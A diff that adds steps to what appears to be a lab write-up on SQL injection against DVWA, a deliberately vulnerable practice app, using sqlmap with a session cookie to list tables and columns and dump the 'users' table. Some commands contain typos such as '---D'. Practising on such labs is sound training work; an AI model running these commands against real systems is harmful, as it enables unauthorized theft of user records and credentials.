@@ -43,6 +43,19 @@ the output is as follows:
 
 dbs is used to enumerate database :
 run the command: sqlmap -u "url" --cookie "php session id and security"--dbs
+![image](https://user-images.githubusercontent.com/82643868/227793984-5b9c4895-b21b-4fa7-9df1-cd9cc89b00d0.png)
+
+running the command : sqlmap -u "url" --cookie "php session id and security"--tables
+it will display all the tables in the database
+![image](https://user-images.githubusercontent.com/82643868/227794041-9f47d302-e033-43b1-afe2-d8f2ffde1f20.png)
+
+run the command : sqlmap -u "url" --cookie "php session id and security"---D dvwa -T users --columns
+it will display all the columns of the table user in the database
+![image](https://user-images.githubusercontent.com/82643868/227794081-b211e351-c162-49eb-8e1c-e1c29f83b738.png)
+
+the command sqlmap -u "url" --cookie "php session id and security"---D dvwa -T users --dump
+will dump all the values of the columns of the table user in a text file locally.
+![image](https://user-images.githubusercontent.com/82643868/227794124-27f72fd7-6c6e-44cf-92ed-88404b4b9bb8.png)
 
 
 
